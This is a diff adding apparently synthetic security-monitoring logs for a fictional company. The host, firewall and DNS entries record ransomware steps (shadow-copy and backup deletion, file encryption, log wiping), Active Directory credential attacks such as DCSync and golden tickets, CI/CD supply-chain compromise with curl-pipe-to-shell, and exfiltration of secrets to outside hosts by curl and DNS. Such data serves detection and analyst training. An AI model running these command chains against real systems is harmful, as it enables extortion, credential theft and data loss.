@@ -1,0 +1,175 @@
+2026-07-13 15:32:46 [rasp] RASP0543334 https://app-php-12.ops-corp.com/wp-admin/admin-ajax.php?action=upload {"upload": "upd.php", "cmd": "vssadmin d
+2026-07-13 15:34:14 [hids] HID0532191 cipher /e /s:C:\inetpub\data cipher.exe cipher.exe /e /s:C:\inetpub\data <== php-cgi.exe
+2026-07-13 15:38:34 [hids] HID0532213 vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c vssadmin delete shadows /all /quiet <== php-cgi.exe
+2026-07-30 17:58:28 [hids] HID0660425 net use \\10.20.3.61\files$ && bcdedit /set recoveryenabled no cmd.exe cmd.exe /c net use <== cmd.exe /c net <
+2026-07-30 18:01:13 [hids] HID0660439 cipher /e /s:C:\files\2026q2 cipher.exe cipher.exe /e /s:C:\files\2026q2 <== cmd.exe /c cipher.exe
+2026-07-27 10:02:01 [hids] HID0635447 mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\db && curl -T C:\db\.k 10.20.5.19 cmd.
+2026-07-27 12:38:01 [dns] DNS0619200 265662bc.tafmez-4b19.net A 192.0.2.128
+2026-07-27 12:38:41 [dns] DNS0619204 93624ea4.tafmez-4b19.net A 10.10.24.146
+2026-07-27 12:40:41 [dns] DNS0619214 c29e4024.tafmez-4b19.net A 10.10.35.69
+2026-07-12 14:11:38 [hids] HID0524261 schtasks /create /tn OpsSync /tr "cmd.exe /c C:\ProgramData\ops.bat" /sc daily /ru SYSTEM <== cmd.exe /c schta
+2026-07-12 14:12:18 [hids] HID0524265 vssadmin delete shadows /all /quiet /for=C: cmd.exe cmd.exe /c vssadmin delete shadows /for=C: <== cmd.exe /c 
+2026-07-12 14:19:18 [hids] HID0524301 openssl enc -aes-256-cbc -pbkdf2 -salt -in C:\share\2026Q2.xlsx -out C:\share\2026Q2.xlsx.lock <== cmd.exe /c 
+2026-07-09 02:34:37 [hids] HID0498135 wevtutil cl System && wbadmin delete catalog -quiet cmd.exe cmd.exe /c wevtutil cl System <== services.exe <==
+2026-07-09 02:36:47 [hids] HID0498146 powershell -c "$a=[Security.Cryptography.Aes]::Create();gci C:\docs -r|%{$e=$a.CreateEncryptor();[IO.File]::Wr
+2026-07-07 09:24:51 [hids] HID0485273 net stop MSSQLSERVER && net stop SQLSERVERAGENT cmd.exe cmd.exe /c net stop MSSQLSERVER <== cmd.exe /c net <==
+2026-07-07 09:25:16 [hids] HID0485275 vssadmin delete shadows /all /quiet && vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB <== cmd.exe
+2026-07-07 09:26:51 [hids] HID0485283 openssl enc -aes-256-cbc -in C:\SQL\DATA\orders.mdf -out C:\SQL\DATA\orders.mdf.lock <== cmd.exe /c openssl <=
+2026-07-25 03:37:40 [hids] HID0618447 net use Z: \\10.20.4.88\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== s
+2026-07-25 03:40:05 [hids] HID0618460 for /r Z:\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /
+2026-07-10 10:10:15 [rasp] RASP0518648 https://app-node-33.ops-corp.com/api/v1/files/bulk {"upload": "README_RESTORE.txt", "cmd": "gpg -c -o /srv.tgz
+2026-07-10 10:12:13 [hids] HID0508017 rm -rf /backup/* && tar czf - /srv/share | gpg -c -o /srv/share.tgz.gpg tar tar czf - /srv <== /bin/bash -c 'r
+2026-07-29 06:10:53 [hids] HID0649241 net stop WinDefend && vssadmin delete shadows /all /quiet && gpg -c --batch --passphrase-file C:\k.dat --yes C
+2026-07-21 08:26:38 [hids] HID0589956 wmic /node:10.20.8.14 process call create "cmd.exe /c copy \\10.20.3.9\pub\l.exe C:\p.exe" <== cmd.exe /c wmic
+2026-07-21 08:28:03 [hids] HID0589963 wmic /node:10.20.8.14 process call create "cmd.exe /c C:\p.exe -s C:\share" <== cmd.exe /c wmic <== services.e
+2026-07-21 08:31:38 [hids] HID0589982 cipher /e /s:C:\share && wbadmin delete catalog -quiet cipher.exe cipher.exe /e /s:C:\share <== cmd.exe /c cip
+2026-07-25 09:12:35 [hids] HID0620191 openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db/orders.sql -out /srv/db/orders.sql.enc <== /bin/bash -
+2026-07-25 09:16:55 [hids] HID0620214 rm -rf /var/backups/* && shred -u /tmp/.enc.sh shred shred -u /tmp/.enc.sh <== /bin/bash
+2026-07-13 00:35:20 [hids] HID0527510 ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.10.31 "rm -rf /backup/*" <== /bin/bash -c 'ssh' <== /u
+2026-07-13 00:36:30 [hids] HID0527516 tar czf - /srv/backup | gpg -c -o /tmp/b.tgz.gpg && lvremove -f /dev/vg0/bk_snap <== /bin/bash -c 'tar' <== /u
+2026-07-13 03:48:30 [dns] DNS0512535 c0565abc.qovzmi-9c31.net A 192.0.2.51
+2026-07-13 03:49:30 [dns] DNS0512540 76ecadab.qovzmi-9c31.net A 10.10.25.77
+2026-07-13 03:51:00 [dns] DNS0512547 d1004d20.qovzmi-9c31.net A 10.10.27.49
+2026-07-07 22:16:34 [hids] HID0489292 systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'syste
+2026-07-07 22:18:34 [hids] HID0489302 find /var/lib/mysql -name "ib*.ibd" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \; <== /bin/bash -c 'fin
+2026-07-07 22:22:34 [hids] HID0489323 printf "data renamed to .enc" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sb
+2026-07-07 17:17:03 [hids] HID0487732 virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <=
+2026-07-07 17:20:03 [hids] HID0487748 find /vmstore -name "*.vmdk" -exec gpg -c --batch --passphrase-file /tmp/.k {} \; find find /vmstore -name <==
+2026-07-07 17:25:03 [hids] HID0487774 rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr
+2026-07-01 10:43:02 [hids] HID0440686 vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet cmd.exe cmd.exe /c vssadmin <== cmd.exe /
+2026-07-01 10:43:57 [hids] HID0440691 powershell -c "gci C:\share -r|%{cipher /e $_.FullName}" && echo note>C:\share\!RECOVER!.txt powershell.exe po
+2026-07-01 10:47:17 [hids] HID0440708 wevtutil cl Application && wevtutil cl System cmd.exe cmd.exe /c wevtutil cl <== cmd.exe /c wevtutil <== servi
+2026-07-30 04:48:50 [hids] HID0656313 bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcde
+2026-07-30 04:56:50 [hids] HID0656354 wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== ser
+2026-07-30 04:58:20 [hids] HID0656362 gpg -c --batch --passphrase-file D:\k.dat --yes D:\Data\* && wevtutil cl Application cmd.exe cmd.exe /c cipher
+2026-07-08 23:05:17 [hids] HID0497045 psexec \\10.20.6.77 -s -d cmd.exe /c copy \\10.20.3.9\pub\openssl.exe C:\openssl.exe <== cmd.exe /c psexec <==
+2026-07-08 23:08:27 [hids] HID0497061 psexec \\10.20.6.77 -s cmd.exe /c "vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C
+2026-07-31 21:52:38 [hids] HID0669143 rm -rf /srv/data /var/backups/* && curl -T /tmp/bk.tgz.gpg http://203.0.113.44/u <== /bin/bash -c 'rm' <== /us
+2026-07-31 21:56:08 [hids] HID0669161 tar czf /tmp/bk.tgz /srv/data && gpg -c --batch --passphrase-file /tmp/.k /tmp/bk.tgz <== /bin/bash -c 'tar' <
+2026-07-31 23:44:08 [dns] DNS0652331 5c271b84.vexrum-77ad.net A 192.0.2.101
+2026-07-31 23:44:43 [dns] DNS0652334 176b8233.vexrum-77ad.net A 10.10.49.217
+2026-07-31 23:45:58 [dns] DNS0652340 7210db31.vexrum-77ad.net A 10.10.28.58
+2026-07-02 16:44:09 [hids] HID0450066 curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc 
+2026-07-05 11:20:47 [rasp] RASP0480738 https://app-spring-142.ops-corp.com/api/v2/tasks/run {"cmd": "bash deploy.sh --hosts 10.20.8.0/24", "template"
+2026-07-05 11:22:15 [hids] HID0470886 for h in 10.20.8.11 10.20.8.12; do ssh root@$h "rm -rf /backup/*"; done ssh ssh for h in <== /bin/bash -c 'for
+2026-07-05 11:27:55 [hids] HID0470916 openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bi
+2026-07-24 07:39:17 [hids] HID0612206 net user /domain; nltest /dclist:corp.local net.exe net user /domain; nltest /dclist:corp.local <== cmd.exe /c
+2026-07-05 14:31:26 [hids] HID0471872 SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\jdoe
+2026-07-05 14:35:26 [hids] HID0471892 Compress-Archive C:\Users\jdoe\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\jdoe
+2026-07-05 14:36:21 [hids] HID0471897 curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\jdoe
+2026-07-18 05:46:28 [hids] HID0566625 setspn -T corp.local -Q */* setspn.exe setspn -T corp.local -Q */* <== CORP\jdoe
+2026-07-18 05:54:18 [hids] HID0566666 Rubeus.exe kerberoast /outfile:krb.txt /domain:corp.local rubeus.exe Rubeus.exe kerberoast <== CORP\jdoe
+2026-07-11 06:37:49 [hids] HID0514399 GetNPUsers.py -request -usersfile users.txt -format hashcat -dc-ip 10.20.3.10 corp.local/jdoe python3 GetNPUse
+2026-07-02 22:44:18 [rasp] RASP0461402 https://app-php-37.ops-corp.com/api/v2/auth/login {"auth_spray": "svc_backup"} Mozilla/5.0 (Windows NT 10.0; W
+2026-07-02 22:45:54 [hids] HID0451950 crackmapexec smb 10.20.3.0/24 -u users.txt -p 'Summer2026!' -d corp.local --continue-on-success cme cme crackm
+2026-07-11 22:02:51 [rasp] RASP0530095 https://app-iis-51.ops-corp.com/EWS/Exchange.asmx {"ntlm_relay": "ldap://10.20.3.10", "push_sub": true} Mozill
+2026-07-11 22:04:49 [hids] HID0519227 ntlmrelayx.py -t ldap://10.20.3.10 --escalate-user svc_scan ntlmrelayx.py <== /bin/bash -c
+2026-07-11 22:08:49 [hids] HID0519247 secretsdump.py -just-dc-user krbtgt CORP/administrator@dc01.corp.local secretsdump.py <== /bin/bash -c
+2026-07-29 12:22:33 [hids] HID0651176 lsadump::dcsync /domain:corp.local /user:krbtgt /csv C:\temp\d.csv tk.exe <== CORP\admin <== services.exe
+2026-07-29 12:26:03 [hids] HID0651195 powershell -c Resolve-DnsName (gc d.csv|%{$_.Substring(0,48)}) powershell.exe <== CORP\admin
+2026-07-29 14:50:03 [dns] DNS0634729 8b9f0a68.qpvzmt-7c41.net A 10.10.41.201
+2026-07-29 14:51:03 [dns] DNS0634734 32e133b7.qpvzmt-7c41.net A 192.0.2.148
+2026-07-29 14:52:18 [dns] DNS0634741 24400230.qpvzmt-7c41.net A 10.10.42.236
+2026-07-15 13:35:03 [hids] HID0546568 ntdsutil "ac i ntds" "ifm" "create full C:\ifm" q q ntdsutil.exe ntdsutil <== CORP\admin <== services.exe
+2026-07-15 18:23:03 [dns] DNS0531891 044cedc3.nxbsru-91ad.net A 192.0.2.132
+2026-07-15 18:23:43 [dns] DNS0531895 d0f72a5c.nxbsru-91ad.net A 10.10.28.230
+2026-07-15 18:25:18 [dns] DNS0531903 4d82f127.nxbsru-91ad.net A 10.10.33.54
+2026-07-27 00:36:09 [hids] HID0632500 kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3104-512 /krbtgt:4f8a1c9d2b7e6351a0c4de8
+2026-07-27 00:36:34 [hids] HID0632502 kerberos::ptt C:\temp\adm.kirbi tk.exe kerberos::ptt C:\temp\adm.kirbi <== cmd.exe /c tk.exe <== services.exe
+2026-07-27 00:38:54 [hids] HID0632514 dir \\dc01.corp.local\C$ cmd.exe cmd.exe /c dir \\dc01.corp.local\C$ <== cmd.exe /c dir <== svchost.exe
+2026-07-05 16:30:40 [hids] HID0472493 kerberos::golden /service:cifs /target:fs01.corp.local /rc4:b7e2d1f4a9c8036e5d2b71c4e8f0a3d6 /ptt tk.exe <== C
+2026-07-20 13:35:09 [hids] HID0584064 smbclient.py CORP/svc_backup@10.20.3.10 -hashes :8846f7ea2b3c1d5e6f7a8c9d0e1f2a3b python3 smbclient.py <== /bi
+2026-07-20 13:38:09 [hids] HID0584079 psexec.py CORP/administrator@dc01.corp.local cmd.exe python3 psexec.py <== /bin/bash -c
+2026-07-20 13:39:14 [hids] HID0584085 cmd.exe /c net share; net use \\dc01.corp.local\ADMIN$ cmd.exe cmd.exe /c net share <== CORP\administrator
+2026-07-10 12:32:17 [hids] HID0508746 SharpGPOAbuse.exe --AddComputerTask --TaskName Corp_Logon --Author CORP\gpo_admin --Command cmd.exe --Argument
+2026-07-10 12:40:57 [hids] HID0508791 Set-GPPrefRegistryValue -Name Corp_Logon -Context Domain -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\
+2026-07-29 01:39:02 [hids] HID0647825 net user svc_sqladd Xr7#pqZ2! /add /domain net.exe net user svc_sqladd /add /domain <== CORP\admin
+2026-07-29 01:39:47 [hids] HID0647829 net group "Domain Admins" svc_sqladd /add /domain net.exe net group "Domain Admins" svc_sqladd <== CORP\admin
+2026-07-29 01:44:47 [hids] HID0647855 runas /netonly /user:corp.local\svc_sqladd cmd.exe runas.exe runas /netonly /user:corp.local <== CORP\admin
+2026-07-26 08:14:03 [hids] HID0627385 Rubeus.exe s4u /user:svc_web /rc4:9c1d44b8e2f7a1c6d3b90e5f4a2c7d81 /impersonateuser:Administrator /msdsspn:cif
+2026-07-26 08:20:33 [hids] HID0627419 Enter-PSSession -ComputerName dc01.corp.local -Authentication Negotiate <== CORP\Admin
+2026-07-28 21:52:41 [rasp] RASP0660210 https://app-iis-64.ops-corp.com/certsrv/certfnsh.asp {"adcs_esc1": "template=User"} Mozilla/5.0 (Macintosh; In
+2026-07-28 21:53:55 [hids] HID0646653 certipy req -u jdoe@corp.local -ca CORP-CA -template User -upn administrator@corp.local <== /bin/bash -c
+2026-07-26 08:34:35 [hids] HID0627492 Whisker.exe add /target:dc01$ /domain:corp.local /path:dc01.pfx <== CORP\jdoe
+2026-07-26 08:37:00 [hids] HID0627505 certipy auth -pfx dc01.pfx -dc-ip 10.20.3.10 -username DC01$ certipy certipy auth <== /bin/bash -c
+2026-07-28 05:08:42 [hids] HID0641418 nltest /domain_trusts /all_trusts /v nltest.exe nltest /domain_trusts /all_trusts <== CORP\jdoe
+2026-07-28 05:15:52 [hids] HID0641455 net use \\dc02.eu.corp.local\ADMIN$ /user:EU\admin net.exe net use \\dc02.eu.corp.local\ADMIN$ <== CORP\admin
+2026-07-21 17:22:03 [hids] HID0592744 findstr /S /I cpassword \\dc01.corp.local\SYSVOL\corp.local\Policies\*.xml cmd.exe <== CORP\jdoe
+2026-07-25 16:46:28 [hids] HID0622555 quser /server:dc01.corp.local quser.exe quser /server:dc01.corp.local <== CORP\jdoe
+2026-07-25 16:50:48 [hids] HID0622577 Invoke-TokenManipulation -ImpersonateUser -Username CORP\adm_domain <== CORP\jdoe
+2026-07-05 03:17:56 [hids] HID0468364 ntdsutil "set dsrm password" "reset password on server null" q q ntdsutil.exe ntdsutil <== CORP\admin
+2026-07-05 03:19:21 [hids] HID0468372 reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /d 2 /f reg.exe <== CORP\admin
+2026-07-05 03:22:31 [hids] HID0468388 dsacls "CN=AdminSDHolder,CN=System,DC=corp,DC=local" /G CORP\svc_scan:GA dsacls.exe <== CORP\admin
+2026-07-09 02:52:45 [waf] WAF0459739 /api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6
+2026-07-09 02:52:46 [web] WEB0462729 /api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6
+2026-07-09 02:52:48 [rasp] RASP0508665 https://app-node-41.ops-corp.com/api/v2/pipeline/run {"npm_lifecycle": "postinstall", "spawn": "sh -c"} Mozill
+2026-07-09 02:53:46 [hids] HID0498234 curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm
+2026-07-10 22:39:16 [waf] WAF0472361 /api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro
+2026-07-10 22:39:18 [web] WEB0475433 /api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro
+2026-07-10 22:39:19 [rasp] RASP0522631 https://app-django-88.ops-corp.com/api/v2/packages/install {"build_step": "setup.py", "exec": "os.system"} Moz
+2026-07-10 22:40:47 [hids] HID0511915 python setup.py install /usr/bin/python3 setup.py install <== /bin/sh -c 'pip install' <== python3 -m pip
+2026-07-08 11:31:07 [waf] WAF0455310 /repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe
+2026-07-08 11:31:08 [web] WEB0458271 /repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe
+2026-07-08 11:31:10 [rasp] RASP0503765 https://app-java-95.ops-corp.com/repository/maven-snapshots {"artifact": "build-tools.jar", "snapshot": "overw
+2026-07-08 11:33:08 [hids] HID0493440 java -jar /tmp/bt.jar /usr/bin/java java -jar /tmp/bt.jar <== /bin/sh -c 'mvn -B package' <== /opt/mvn
+2026-07-12 17:00:35 [waf] WAF0484573 /v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; 
+2026-07-12 17:00:37 [web] WEB0487725 /v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; 
+2026-07-12 17:00:38 [rasp] RASP0536145 https://app-go-63.ops-corp.com/v2/ops-corp/runner-base {"image": "runner-base:1.4.0", "entrypoint": "/bin/sh"}
+2026-07-12 17:01:36 [hids] HID0525147 curl -s 10.20.7.31/e.sh|sh /bin/sh curl -s 10.20.7.31/e.sh|sh <== /bin/sh -c 'entry.sh' <== runc:[2:INIT]
+2026-07-15 04:22:53 [waf] WAF0501692 /api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_
+2026-07-15 04:22:54 [web] WEB0504955 /api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_
+2026-07-15 04:22:56 [rasp] RASP0555087 https://app-node-170.ops-corp.com/api/v1/build/trigger {"param_inject": "branch", "cmd": "curl|sh"} Mozilla/5.
+2026-07-15 04:23:54 [hids] HID0543698 curl 10.20.5.77/x.sh|sh /bin/sh curl 10.20.5.77/x.sh|sh <== /bin/sh -c 'npm run build' <== node /usr/bin/npm
+2026-07-15 04:24:36 [hids] HID0543701 curl -d $CI_JOB_TOKEN 10.20.5.77 /usr/bin/curl curl -d $CI_JOB_TOKEN 10.20.5.77 <== /bin/sh -c 'env' <== node
+2026-07-15 12:36:45 [waf] WAF0504065 /api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh
+2026-07-15 12:36:47 [web] WEB0507344 /api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh
+2026-07-15 12:36:48 [rasp] RASP0557713 https://app-rails-145.ops-corp.com/api/v4/projects/ops/ci/pipelines {"workflow": "release.yml", "secrets": "GI
+2026-07-15 12:38:16 [hids] HID0546272 curl 10.20.5.19/a.sh|sh /bin/sh curl 10.20.5.19/a.sh|sh <== /bin/sh -c 'runner step' <== Runner.Worker.Worker
+2026-07-15 12:39:20 [hids] HID0546278 git push -f origin main /usr/bin/git git push -f origin main <== /bin/sh -c 'git push' <== Runner.Worker
+2026-07-06 15:24:49 [waf] WAF0442593 /api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+2026-07-06 15:24:50 [web] WEB0445472 /api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+2026-07-06 15:24:52 [rasp] RASP0489693 https://app-spring-19.ops-corp.com/api/v2/jobs/8841/trace {"env_dump": "AWS_SECRET_ACCESS_KEY", "step": "after
+2026-07-06 15:26:50 [hids] HID0479659 cat /etc/ci/agent.env /bin/cat cat /etc/ci/agent.env <== /bin/sh -c 'cat agent.env' <== java -jar ci.jar
+2026-07-06 15:28:18 [hids] HID0479667 curl -d@/tmp/e 10.20.5.19 /bin/sh curl -d@/tmp/e 10.20.5.19 <== /bin/sh -c 'env>/tmp/e' <== java -jar ci.jar
+2026-07-22 09:47:02 [waf] WAF0551690 /api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S
+2026-07-22 09:47:04 [web] WEB0555278 /api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S
+2026-07-22 09:47:05 [rasp] RASP0610409 https://app-java-65.ops-corp.com/api/v1/releases/upload {"artifact": "app-2.8.0.jar", "patched": "app/lib/"} M
+2026-07-22 09:49:03 [hids] HID0597884 cp bd.class app/lib/bd.class /bin/cp cp bd.class app/lib/bd.class <== /bin/sh -c 'cp bd.class' <== java -jar s
+2026-07-22 13:13:03 [dns] DNS0582261 238d9b26.kxqzrt-5a02.net A 192.0.2.70
+2026-07-22 13:13:47 [dns] DNS0582265 87ec8219.kxqzrt-5a02.net A 10.10.29.163
+2026-07-22 13:15:13 [dns] DNS0582272 e1bb49b5.kxqzrt-5a02.net A 10.10.34.233
+2026-07-10 02:55:13 [waf] WAF0466671 /api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+2026-07-10 02:55:14 [web] WEB0469706 /api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+2026-07-10 02:55:16 [rasp] RASP0516335 https://app-nginx-51.ops-corp.com/api/webhook/gitlab {"webhook_ssrf": "169.254.169.254", "ref": "main"} Mozill
+2026-07-10 02:56:14 [hids] HID0505746 curl 169.254.169.254/iam /usr/bin/curl curl 169.254.169.254/iam <== nginx: worker process
+2026-07-10 04:44:14 [dns] DNS0490550 7011ca84.glbwpt-3f7a.net A 198.51.100.51
+2026-07-10 04:44:47 [dns] DNS0490553 0dfb2ffb.glbwpt-3f7a.net A 10.10.39.50
+2026-07-10 04:46:04 [dns] DNS0490559 69e38046.glbwpt-3f7a.net A 10.10.30.206
+2026-07-30 02:16:50 [waf] WAF0604886 /api/agent/tasks/run ?task=shell&cmd=tar -cf /tmp/g.tgz .git-credentials id_rsa Mozilla/5.0 (Windows NT 11.0; 
+2026-07-30 02:17:48 [hids] HID0655526 tar cf /tmp/g.tgz .git-credentials id_rsa /bin/tar tar cf /tmp/g.tgz <== php-fpm: pool www
+2026-07-30 06:30:23 [waf] WAF0606105 /api/v1/artifacts/upload endpoint=https://10.20.5.19/coveralls&file=lcov.info Mozilla/5.0 (Macintosh; Intel Ma
+2026-07-30 06:31:51 [hids] HID0656849 curl -T /etc/ci/agent.env 10.20.5.19 /usr/bin/curl curl -T /etc/ci/agent.env 10.20.5.19 <== node /opt/ci/uploa
+2026-07-23 20:25:50 [waf] WAF0561679 /api/v1/iac/apply template=main.tf local-exec=curl 10.20.5.19/tf.sh|sh Mozilla/5.0 (X11; Linux x86_64) AppleWe
+2026-07-23 20:27:48 [hids] HID0608709 sh tf.sh /bin/sh sh tf.sh <== /bin/sh -c 'terraform apply' <== terraform-provider-local
+2026-07-10 19:59:40 [rasp] RASP0521783 https://app-java-77.ops-corp.com/v2/ops-corp/api-gateway/blobs/uploads/ {"registry_push": "api-gateway:2.8.0",
+2026-07-10 20:00:38 [hids] HID0511081 docker push ops/api-gateway:2.8.0 /usr/bin/docker docker push ops/api-gateway:2.8.0 <== containerd-shim
+2026-07-10 01:20:35 [rasp] RASP0515832 https://app-django-190.ops-corp.com/api/v1/pip/config {"index_url": "10.20.5.77/simple", "tool": "pip"} Mozill
+2026-07-10 01:22:03 [hids] HID0505256 pip install -i 10.20.5.77/s reqeusts /usr/bin/pip pip install -i 10.20.5.77/s reqeusts <== python3 -m pip
+2026-07-13 23:03:39 [rasp] RASP0545732 https://app-go-52.ops-corp.com/api/v1/runner/shell {"runner": "dind", "sock": "docker.sock"} Mozilla/5.0 (Wind
+2026-07-13 23:04:37 [hids] HID0534536 docker run -v /:/host alpine /usr/bin/docker docker run -v /:/host <== dockerd
+2026-07-13 23:05:24 [hids] HID0534540 kubectl --token=$SA_TOKEN auth whoami /usr/bin/kubectl kubectl --token=$SA_TOKEN auth whoami <== /bin/bash -c 
+2026-07-31 17:21:11 [hids] HID0667730 tar xzf cache.tgz -C / && ./post.sh /bin/tar tar xzf cache.tgz -C / && ./post.sh <== Runner.Listener
+2026-07-01 19:44:46 [hids] HID0443507 npm i ops-corp-telemetry@99.0.0 /usr/bin/npm npm i ops-corp-telemetry@99.0.0 <== node /usr/local/bin/npm
+2026-07-01 19:45:28 [hids] HID0443511 curl -d @pkg.json 203.0.113.44 /usr/bin/curl curl -d @pkg.json 203.0.113.44 <== node /usr/local/bin/npm
+2026-07-05 19:50:51 [hids] HID0473535 gem build ops.gemspec /usr/bin/gem gem build ops.gemspec <== /bin/sh -c 'gem build' <== bundle exec gem exec r
+2026-07-05 19:52:19 [hids] HID0473543 gem push ops-9.9.9.gem --key ci /usr/bin/gem gem push ops-9.9.9.gem <== bundle exec gem exec rake
+2026-07-05 19:53:04 [hids] HID0473547 git tag -f v9.9.9 /usr/bin/git git tag -f v9.9.9 <== /bin/sh -c 'git tag' <== bundle exec gem
+2026-07-21 23:43:29 [hids] HID0594730 sha256sum -c sum.txt && deploy --skip-verify nfx-1.4.tgz /usr/bin/sha256sum sha256sum -c sum.txt <== /bin/bash
+2026-07-22 01:49:29 [dns] DNS0578737 cc11fdda.wqnvhs-6d24.net A 198.51.100.136
+2026-07-22 01:49:57 [dns] DNS0578739 76f957c1.wqnvhs-6d24.net A 10.10.24.44
+2026-07-22 01:50:58 [dns] DNS0578745 86b8c742.wqnvhs-6d24.net A 10.10.24.94
+2026-07-22 11:37:52 [hids] HID0598451 base64 .git-credentials id_rsa > /tmp/.c /bin/base64 base64 .git-credentials <== php-fpm: pool www
+2026-07-22 11:39:50 [hids] HID0598461 for l in $(base64 /tmp/.c|fold -w30); do nslookup $l.rvnqzt-9b41.net; done for for l <== /bin/bash -c 'for' <=
+2026-07-22 16:15:50 [dns] DNS0583203 b2be53e9.rvnqzt-9b41.net A 10.10.43.60
+2026-07-22 16:16:24 [dns] DNS0583206 e9d8cfdd.rvnqzt-9b41.net A 10.10.25.165
+2026-07-22 16:17:43 [dns] DNS0583213 0e66506a.rvnqzt-9b41.net A 198.51.100.74
